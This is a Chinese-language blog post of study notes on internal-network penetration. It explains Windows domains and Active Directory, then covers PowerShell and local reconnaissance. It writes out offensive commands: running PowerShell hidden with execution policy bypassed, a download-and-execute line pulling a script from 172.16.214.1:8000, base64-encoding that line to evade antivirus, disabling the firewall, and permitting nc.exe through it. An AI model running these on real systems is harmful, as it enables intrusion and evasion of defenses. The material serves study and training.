<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>内网安全学习笔记 | Jici&#39;s Blog</title>
  <meta name="author" content="Jici">
  
  <meta name="description" content="[TOC]
内网常见名词解释
1、工作组">
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <meta property="og:title" content="内网安全学习笔记"/>
  <meta property="og:site_name" content="Jici&#39;s Blog"/>

  
    <meta property="og:image" content=""/>
  

  
  
    <link href="/favicon-16x16.png" rel="icon">
  
  
  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

  <script src="/js/jquery-2.0.3.min.js"></script>

  <!-- analytics -->
  
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
  ga('create', 'UA-70812759-1', 'auto');
  ga('send', 'pageview');
</script>



<script>
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "//hm.baidu.com/hm.js?cb5448498d7169c668b07c2b255d62c1";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script>


<!-- hexo injector head_end start --><script> let HEXO_MMEDIA_DATA = { js: [], css: [], aplayerData: [], metingData: [], artPlayerData: [], dplayerData: []}; </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">Jici&#39;s Blog</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class=""></i>所有文章
			</a>
		  </li>
		  
		  <li>
			<a href="/about" title="About me.">
			  <i class=""></i>关于我
			</a>
		  </li>
		  
		  <li>
			<a href="/record" title="Record all kinds of completed target machines">
			  <i class=""></i>记录榜
			</a>
		  </li>
		  
		  <li>
			<a href="/plan" title="Record what needs to be done and what is worth doing">
			  <i class=""></i>计划清单
			</a>
		  </li>
		  
		  <li>
			<a href="/friendlinks" title="my friends">
			  <i class=""></i>友情链接
			</a>
		  </li>
		  
		  <li>
			<a href="/pictureGallery" title="Record some exquisite pictures">
			  <i class=""></i>画廊
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 

  
<script type="text/x-mathjax-config">
  MathJax.Hub.Config({
    tex2jax: {
      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
      processEscapes: true,
      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    }
  });
  MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
        all[i].SourceElement().parentNode.className += ' has-jax';
    }
  });
</script>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/mathjax@2.7.8/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>



	
		<div class="page-header">
			<h1> 内网安全学习笔记</h1>
		</div>
	



<div class="row post">
	<!-- cols -->
	
	<div id="top_meta"></div>
	<div class="col-md-9">
	

	<!-- content -->
	<div class="mypage">		
	  		

	  <p>[TOC]</p>
<h1>内网常见名词解释</h1>
<h2 id="1、工作组">1、工作组</h2>
<h3 id="工作组-Work-Group">工作组 <code>Work Group</code></h3>
<p><mark>是最常见最简单最普通的资源管理模式，就是将不同的电脑按功能分别列入不同的组中，以方便管理</mark>。比如在一个网络内，可能有成百上千台工作电脑，如果这些电脑不进行分组，都列在“网上邻居”内，可想而知会有多么乱。为了解决这一问题，Windows 9x/NT/2000 引用了“工作组”这个概念，比如一所高校，会分为诸如数学系、中文系之类的，然后数学系的电脑全都列入数学系的工作组中，中文系的电脑全部都列入到中文系的工作组中……如果你要访问某个系别的资源，就在“网上邻居”里找到那个系的工作组名，双击就可以看到那个系别的电脑了。<mark>在工作组中所有的计算机都是平等的，没有管理与被管理之分，因此工作组网络也称为对等网络。所以对于管理者而言，工作组的管理方式有时会不太便于管理，这时候就需要了解域的概念了</mark>。</p>
<h2 id="2、域">2、域</h2>
<h3 id="域-Domain">域 <code>Domain</code></h3>
<p>可以简单的理解成工作组的升级版，如果说工作组是“免费旅店”那么域就是“星级宾馆”；工作组可以随便进进出出，而域则有严格的控制。<mark>在“域”模式下，至少有一台服务器负责每一台联入网络的电脑和用户的验证工作，相当于一个单位的门卫一样，称为域控制器</mark>。</p>
<h3 id="域控制器-Domain-Controller">域控制器 <code>Domain Controller</code></h3>
<p><mark>简写为 DC，又称域控、域控器。域控制器中包含了由这个域的账户、密码、属于这个域的计算机等信息构成的数据库</mark>。当电脑连入网络时，域控制器首先要鉴别这台电脑是否是属于这个域的，用户使用的登录账号是否存在、密码是否正确。如果以上信息有一样不正确的，那么域控制器就会拒绝这个用户从这台电脑登录。不能登录，用户就不能访问服务器上有权限保护的资源，这样就在一定程度上保护了网络上的资源。==正是因为域控起到了一个身份验证的作用，因此站在渗透的角度来说，拿下域控是至关重要的。拿下了域控，就相当于拿到了整个域内所有计算机的账号和密码。而要想实现域环境，就必须要计算机中安装活动目录，也可以说如果在内网中的一台计算机上安装了活动目录，那它就变成了域控制器。==在域中除了域控制器还有成员服务器、客户机、独立服务器。除此之外，域控制器还有以下几点常识：</p>
<ul>
<li>
<p>一般情况下，域控制器集成了DNS服务，可以解析域内的计算机名称（基于TCP/IP），解决了工作组环境不同网段计算机不能使用计算机名互访的问题</p>
</li>
<li>
<p>Active Directory = LDAP服务器＋LDAP应用（Windows域控）。就是Active Directory先实现一个LDAP服务器，然后再用这个LDAP服务器实现了自己的一个具体应用（域控）。</p>
</li>
</ul>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231101122244729.png" alt="image-20231101122244729"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231101122254694.png" alt="image-20231101122254694"></p>
<h3 id="父域和子域">父域和子域</h3>
<p>顾名思义，<mark>在一个域下新建了一个域便称其为子域</mark>。形象的来说，一个部门一个域，那个如果这个部门还有分部，那每个分部就可被称为子域，这个大的部门便称为父域。<mark>每个域中都有独立的安全策略</mark>。</p>
<h3 id="主域">主域</h3>
<p>说明：主域有多重意思，要注意区分。</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231101101918772.png" alt="image-20231101101918772"></p>
<h3 id="主域和父域">主域和父域</h3>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231101102113300.png" alt="image-20231101102113300"></p>
<h3 id="域树">域树</h3>
<p><mark>域树由多个域组成，这些域共享同一表结构和配置，形成一个连续的名字空间。树中的域通过信任关系连接起来，活动目录包含一个或多个域树。域树中的域层次越深级别越低</mark>，一个“.”代表一个层次，<a target="_blank" rel="noopener" href="http://xn--child-mt3iw1h.Microsoft.com">如域child.Microsoft.com</a> 就比 Microsoft.com这个域级别低，因为它有两个层次关系，而Microsoft.com只有一个层次。而域Grandchild.Child.Microsoft.com又比 Child.Microsoft.com级别低，道理一样。他们都属于同一个域树。Child.Microsoft.com就属于Microsoft.com的子域。多个域树可以组成一个域林。</p>
<h3 id="域林">域林</h3>
<p><mark>域林是指由一个或多个没有形成连续名字空间的域树组成，它与域树最明显的区别就在于域林之间没有形成连续的名字空间，而域树则是由一些具有连续名字空间的域组成</mark>。但域林中的所有域树仍共享同一个表结构、配置和全局目录。域林中的所有域树通过Kerberos 信任关系建立起来，所以每个域树都知道Kerberos信任关系，不同域树可以交叉引用其他域树中的对象。<mark>域林都有根域，域林的根域是域林中创建的第一个域，域林中所有域树的根域与域林的根域建立可传递的信任关系</mark>。<a target="_blank" rel="noopener" href="http://xn--benet-gv5ij80i.com.cn">比如benet.com.cn</a>,<a target="_blank" rel="noopener" href="http://xn--accp-k84fzc0jl1d32ova062c9jy86gfdifv7a053c.com.cn">则可以创建同属与一个林的accp.com.cn</a>,他们就在同一个域林里。当创建第一个域控制器的时候，就创建了第一个域（也称林根域），和第一个林。林，是一个或多个共享公共架构和全局编录的域组成，每个域都有单独的安全策略，和与其他域的信任关系。一个单位可以有多个林。</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231031133844040.png" alt="image-20231031133844040"></p>
<h2 id="3、活动目录">3、活动目录</h2>
<p><strong>活动目录</strong> <code>Active Directory</code> ，简写为 <code>AD</code>，它是 Windows Server 中负责架构中大型网络环境的集中式目录管理服务，在Windows 2000 Server 开始内置于 Windows Server 产品中。目录包含了有关各种对象，例如用户、用户组、计算机、域、组织单位（OU）以及安全策略的信息。目录存储在域控上，并且可以被网络应用程序或者服务所访问。<mark>活动目录就相当于内网中各种资源的一个目录，通过活动目录用户可以快速定位到这些资源的位置。</mark></p>
<h2 id="4、DMZ">4、DMZ</h2>
<p>DMZ <code>demilitarized zone</code> ，中文名为“隔离区”，或称“非军事化区”。<mark>它是为了解决安装防火墙后外部网络的访问用户不能访问内部网络服务器的问题，从而设立的一个非安全系统与安全系统之间的缓冲区</mark>。DMZ 区可以理解为一个不同于外网或内网的特殊网络区域，DMZ 内通常放置一些不含机密信息的公用服务器，比如 WEB 服务器、E-Mail 服务器、FTP 服务器等。这样来自外网的访问者只可以访问 DMZ 中的服务，但不可能接触到存放在内网中的信息等，即使 DMZ 中服务器受到破坏，也不会对内网中的信息造成影响。</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231107164050773.png" alt="image-20231107164050773"></p>
<blockquote>
<p>在实战中，一般由web打点进入的（比如文件上传漏洞上传webshell后打入的机器），都属于DMZ区域的机器【上面提到过了，DMZ区域一般放置 WEB 服务器、E-Mail 服务器、FTP 服务器等】</p>
</blockquote>
<h2 id="5、域内的各种权限">5、域内的各种权限</h2>
<h3 id="组">组</h3>
<p>首先要理解一下组的概念，在组里包含了很多用户，组（Group）是用户帐号的集合，当管理员想要给某个用户分配权限时，只需要将用户加入到对应权限的组里就行，从而提高了管理效率，常见的组有：域本地组、全局组、通用组</p>
<ul>
<li>域本地组：来自全林用于本域【多域用户访问单域资源（访问同一个域）】</li>
<li>全局组：来自本域用于全林【单域用户访问多域资源（必须是一个域里面的用户）】</li>
<li>通用组：来自全林用于全林【多域用户访问多域资源】</li>
</ul>
<h3 id="域用户和本地用户">域用户和本地用户</h3>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231101104023652.png" alt="image-20231101104023652"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231101104041587.png" alt="image-20231101104041587"></p>
<p>这里对域用户做一些解读，便于理解。<mark>域用户，也称域内用户，就是域环境中的用户</mark>。和本地用户帐户不同，<mark>本地用户帐户保存在创建该用户的主机上的本地用户数据库中，而域用户帐户保存在活动目录中</mark>。 由于所有的用户帐户都集中保存在活动目录中，所以使得集中管理变成可能。言外之意就是，<mark>域用户帐户保存在活动目录中，而活动目录安装在域控制器上，所以域用户帐户保存在域控制器上</mark>。</p>
<p>再说明一点，<mark>域用户和域管理用户与这个用户原本归属于哪台主机无关(即与用户来自于哪台主机无关)，而是通过用户组(域用户组、域管理用户组)进行管理的，即把用户加到用户组里就赋予了这个用户特殊的身份。本地用户则和归属于哪台主机有关，在主机A上创建的用户就是主机A的本地用户，在主机B上创建的用户就是主机B的本地用户</mark></p>
<h3 id="A-G-DL-P-策略">A-G-DL-P 策略</h3>
<p>A-G-DL-P 策略是将用户账号添加到全局组中，将全局组添加到域本地组中，然后为域本地组分配资源权限。按照AGDLP的原则对用户进行组织和管理起来更容易。在AGDLP形成以后当给一个用户某一个权限的时候,只要把这个用户加入到某一个本地域组就可以了</p>
<ul>
<li>A(account)表示用户账号</li>
<li>G(Global group)表示全局组</li>
<li>U(Universal group)表示通用组</li>
<li>DL(Domain local group)表示域本地组</li>
<li>P(Permission 许可)表示资源权限</li>
</ul>
<h1>PowerShell</h1>
<h2 id="PowerShell常识">PowerShell常识</h2>
<p>说明：PowerShell 可以简单的理解为 cmd 的高级版，cmd 能做的事在 PowerShell 中都能做，但 PowerShell 还能做很多 cmd 不能做的事情。PowerShell 内置在 Windows 7、Windows Server 2008 R2 及更高版本的 Windows 系统中</p>
<ul>
<li>PowerShell 是构建在 .NET 平台上的，所有命令传递的都是 .NET 对象</li>
<li>Windows 7 以上的操作系统默认安装</li>
<li>PowerShell 脚本可以运行在内存中，不需要写入磁盘</li>
<li>可以从另一个系统中下载 PowerShell 脚本并执行</li>
<li>目前很多工具都是基于 PowerShell 开发的</li>
<li>很多安全软件检测不到 PowerShell 的活动</li>
<li>cmd 通常会被阻止运行，但是 PowerShell 不会【但注意，这并不意味着所有指令都要在PowerShell中运行。恰恰相反，PowerShell会受到一些安全策略的影响，一些指令反而能在CMD中执行却不能在PowerShell中执行】<img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231114232014409.png" alt="image-20231114232014409"></li>
<li>可以用来管理活动目录</li>
<li>ps1 是PowerShell 的脚本扩展名，一个 PowerShell 脚本文件其实就是一个简单的文本文件</li>
</ul>
<p>Windows 操作系统对应的 PowerShell 版本信息：</p>
<ul>
<li>PowerShell 1.0: Windows XP SP2, Windows Server 2003 SP1/SP2</li>
<li>PowerShell 2.0: Windows 7, Windows Server 2008 R2</li>
<li>PowerShell 3.0: Windows 8, Windows Server 2012</li>
<li>PowerShell 4.0: Windows 8.1, Windows Server 2012 R2</li>
<li>PowerShell 5.0: Windows 10, Windows Server 2016</li>
<li>PowerShell 5.1: Windows 10 Anniversary Update, Windows Server 2016 Anniversary Update</li>
<li>PowerShell 6.0: Cross-platform (Windows, macOS, Linux)</li>
<li>PowerShell 7.x: Cross-platform (Windows, macOS, Linux)</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">#使用以下任一命令查看 PowerShell 版本
Get-Host
$PSVersionTable <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231107164215675.png" alt="image-20231107164215675"></p>
<h2 id="PowerShell执行策略">PowerShell执行策略</h2>
<p>为了防止恶意脚本在 PowerShell 中被运行，PowerShell 有个执行策略，默认情况下，这个执行策略是受限模式<code>Restricted</code>。</p>
<pre class="line-numbers language-none"><code class="language-none">#查看当前执行策略
Get-ExecutionPolicy<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231031140702755.png" alt="image-20231031140702755"></p>
<p>执行策略有以下几种：</p>
<ul>
<li>
<p>Restricted：不能运行脚本。</p>
</li>
<li>
<p>RemoteSigned：本地创建的脚本可以运行，但从网上下载的脚本不能运行（除非它们拥有由受信任的发布者签署的数字签名）</p>
</li>
<li>
<p>AllSigned：仅当脚本由受信任的发布者签名才能运行。</p>
</li>
<li>
<p>Unrestricted：脚本执行不受限制，不管来自哪里，也不管它们是否有签名。</p>
</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">可以使用Set-ExecutionPolicy &lt;policy name&gt;设置执行策略，该命令需要管理员权限<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231031140935644.png" alt="image-20231031140935644"></p>
<h2 id="PowerShell-运行脚本的方式">PowerShell 运行脚本的方式</h2>
<p>PowerShell 运行脚本的方式和其他 shell 基本一致，可以输入完整路径运行，也可以到 ps1 文件所在目录下去运行</p>
<pre class="line-numbers language-none"><code class="language-none">#完整路径运行
C:\t.ps1
#前往脚本所在目录运行
cd C:\
.\t.ps1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="PowerShell中的管道">PowerShell中的管道</h2>
<p>PowerShell 中的管道中同样支持管道符|，下面举个例子</p>
<pre class="line-numbers language-none"><code class="language-none">#在 PowerShell 中获取进程信息并以程序 ID 进行排序
Get-Process | Sort-Object ID<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231031141302472.png" alt="image-20231031141302472"></p>
<h2 id="PowerShell命令与参数">PowerShell命令与参数</h2>
<p>PowerShell解释器常用参数：</p>
<ul>
<li>
<p>-NoLogo：启动不显示版权标志的PowerShell</p>
</li>
<li>
<p>-WindowStyle Hidden (-W Hidden)：隐藏窗口</p>
</li>
<li>
<p>-NoProfile (-NoP)：不加载当前用户的配置文件</p>
</li>
<li>
<p>-EncodedCommand(–Enc)：执行 base64 编码后的 powershell 脚本字符串</p>
</li>
<li>
<p>-ExecutionPolicy Bypass (-Exec Bypass) ：绕过执行安全策略</p>
</li>
<li>
<p>-Noexit：执行后不退出Shell，这在使用键盘记录等脚本时非常重要</p>
</li>
<li>
<p>-NonInteractive (-Nonl)：非交互模式，PowerShell 不为用户提供交互的提示</p>
</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">#更多参数可以使用PowerShell[.exe] -Help | -? | &#x2F;?进行查看

#启动不显示版权标志的PowerShell
powershell.exe -NoLogo

#执行PowerShell脚本
New-Item test.ps1 -ItemType file
Set-Content test.ps1 -Value &quot;calc&quot;
PowerShell.exe -File test.ps1

#执行 base64 编码后的 powershell 脚本字符串dir &#39;c:\program files&#39;
$command &#x3D; &quot;dir &#39;c:\program files&#39; &quot;
$bytes &#x3D; [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand &#x3D; [Convert]::ToBase64String($bytes)
powershell.exe -encodedCommand $encodedCommand<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231031142822484.png" alt="image-20231031142822484"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231031145721112.png" alt="image-20231031145721112"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231031144515691.png" alt="image-20231031144515691"></p>
<p>PowerShell 命令格式：<mark>在 PowerShell 下，命令的命名规范很一致，都采用了动词-名词的形式</mark>，如 Net-Item，动词一般为 Add、New、Get、Remove、Set 等。PowerShell 还兼容 cmd 和 Linux 命令，如查看目录可以使用 dir 或者 ls，其实质是通过别名实现</p>
<pre class="line-numbers language-none"><code class="language-none">#文件操作类命令
#新建目录test
New-Item test -ItemType directory
#删除目录test
Remove-Item test
#新建文件test.txt
New-Item test.txt -ItemType file
#新建文件test.txt，内容为 hello
New-Item test.txt -ItemType file -value &quot;hello&quot;
#删除文件test.txt
Remove-Item test.txt
#查看文件test.txt内容
Get-Content test.txt
#设置文件test.txt内容
Set-Content test.txt -Value &quot;hello&quot;
#给文件test.txt追加内容
Add-Content test.txt -Value &quot;,word!&quot;
#清除文件test.txt内容
Clear-Content test.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="绕过本地权限并执行PowerShell脚本">绕过本地权限并执行PowerShell脚本</h3>
<pre class="line-numbers language-none"><code class="language-none">PowerShell.exe -ExecutionPolicy Bypass -File test.ps1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231031155750745.png" alt="image-20231031155750745"></p>
<h3 id="绕过本地权限并隐藏执行PowerShell脚本">绕过本地权限并隐藏执行PowerShell脚本</h3>
<pre class="line-numbers language-none"><code class="language-none">#加入-WindowStyle Hidden -NoLogo -NonInteractive -NoProfile 即可隐藏执行
PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoLogo -NonInteractive -NoProfile -File test.ps1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h3 id="下载远程脚本绕过权限并隐藏执行">下载远程脚本绕过权限并隐藏执行</h3>
<pre class="line-numbers language-none"><code class="language-none">PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoLogo -NonInteractive -NoProfile &quot;IEX(New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;172.16.214.1:8000&#x2F;t.ps1&#39;)&quot;
#或者简写
PowerShell.exe -Exec Bypass -W Hidden -NoLogo -NonI -NoP &quot;IEX(New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;172.16.214.1:8000&#x2F;t.ps1&#39;)&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h3 id="利用-Base64-对命令进行编码">利用 Base64 对命令进行编码</h3>
<p>说明：使用 Base64 进行编码主要是为了混淆代码以避免被杀毒软件查杀，<mark>注意这里直接使用 Base64 编码是不行的</mark>，可以使用 Github 上的一个编码工具【<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/darkoperator/powershell_scripts/master/ps_encoder.py%E3%80%91">https://raw.githubusercontent.com/darkoperator/powershell_scripts/master/ps_encoder.py】</a></p>
<p>编码工具使用：下载好后，需要先将要执行的命令保存到文本文件中，比如保存到 tmp.txt 文本中，之后执行 <code>python ps_encoder.py -s tmp.txt</code> 即可</p>
<pre class="line-numbers language-none"><code class="language-none">&gt;cat tmp.txt
IEX(New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;172.16.214.1:8000&#x2F;t.ps1&#39;)

&gt;python ps_encoder.py -s tmp.txt
SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEANwAyAC4AMQA2AC4AMgAxADQALgAxADoAOAAwADAAMAAvAHQALgBwAHMAMQAnACkA

#使用 –Enc 指定 Base64 编码内容
PowerShell.exe -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEANwAyAC4AMQA2AC4AMgAxADQALgAxADoAOAAwADAAMAAvAHQALgBwAHMAMQAnACkA<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1>本地工作组信息收集</h1>
<h2 id="1、手动收集本地工作组信息">1、手动收集本地工作组信息</h2>
<h3 id="基础信息收集">基础信息收集</h3>
<pre class="line-numbers language-none"><code class="language-none">#查看当前权限
whoami
#本机网络配置信息
ipconfig &#x2F;all
#操作系统和版本信息（英文版）
systeminfo | findstr &#x2F;B &#x2F;C:&quot;OS Name&quot; &#x2F;C:&quot;OS Version&quot; 
#操作系统和版本信息（中文版）
systeminfo | findstr &#x2F;B &#x2F;C:&quot;OS 名称&quot; &#x2F;C:&quot;OS 版本&quot;
#查看系统体系结构
echo %PROCESSOR_ARCHITECTURE%
#查看系统所有环境变量
set
#查看安装的软件及版本和路径等信息
wmic product get name,version
#利用 PowerShell 收集软件版本信息
powershell &quot;Get-WmiObject -class Win32_Product |Select-Object -Property name,version&quot;
#查询本机服务信息
wmic service list brief
#查询进程列表
tasklist &#x2F;v
#wmic 查看进程信息
wmic process list brief
#查看启动程序信息
wmic startup get command,caption
#查看计划任务
schtasks &#x2F;query &#x2F;fo LIST &#x2F;v
#查看主机开启时间
net statistics workstation
#查询用户列表
net user
#查看指定用户的信息
net user teamssix
#查看本地管理员用户
net localgroup administrators
#查看当前在线用户
query user || qwinsta
#列出或断开本地计算机和连接的客户端的会话
net session
#查看端口列表
netstat –ano
#查看补丁列表
systeminfo
#使用 wmic 查看补丁列表
wmic qfe get Caption,Description,HotFixID,InstalledOn
#查看本机共享
net share
#使用 wmic 查看共享列表
wmic share get name,path,status
#查询路由表及所有可用接口的ARP 缓存表
route print
arp –a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="查询防火墙相关配置">查询防火墙相关配置</h3>
<ul>
<li>关闭防火墙</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">netsh firewall set opmode disable (Windows Server 2003 系统及之前版本)
netsh advfirewall set allprofiles state off	(Windows Server 2003 系统及之后版本)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<ul>
<li>查看防火墙配置</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">netsh firewall show config<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<ul>
<li>修改防火墙配置</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">(Windows Server 2003 系统及之前版本)
允许指定程序全部连接
netsh firewall add allowedprogram c:\nc.exe &quot;allow nc&quot; enable

(Windows Server 2003 之后系统版本)
允许指定程序连入
netsh advfirewall firewall add rule name&#x3D;&quot;pass nc&quot; dir&#x3D;in action&#x3D;allow program&#x3D;&quot;C: \nc.exe&quot;

允许指定程序连出
netsh advfirewall firewall add rule name&#x3D;&quot;Allow nc&quot; dir&#x3D;out action&#x3D;allow program&#x3D;&quot;C: \nc.exe&quot;

允许 3389 端口放行
netsh advfirewall firewall add rule name&#x3D;&quot;Remote Desktop&quot; protocol&#x3D;TCP dir&#x3D;in localport&#x3D;3389 action&#x3D;allow<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>自定义防火墙日志储存位置</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">netsh advfirewall set currentprofile logging filename &quot;C:\windows\temp\fw.log&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="查看计算机代理配置情况">查看计算机代理配置情况</h3>
<pre class="line-numbers language-none"><code class="language-none">reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231031173233505.png" alt="image-20231031173233505"></p>
<pre class="line-numbers language-none"><code class="language-none">#回显如下
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings
IE5_UA_Backup_Flag REG_SZ 5.0
User Agent REG_SZ Mozilla&#x2F;4.0 (compatible; MSIE 8.0; Win32)
EmailName REG_SZ User@
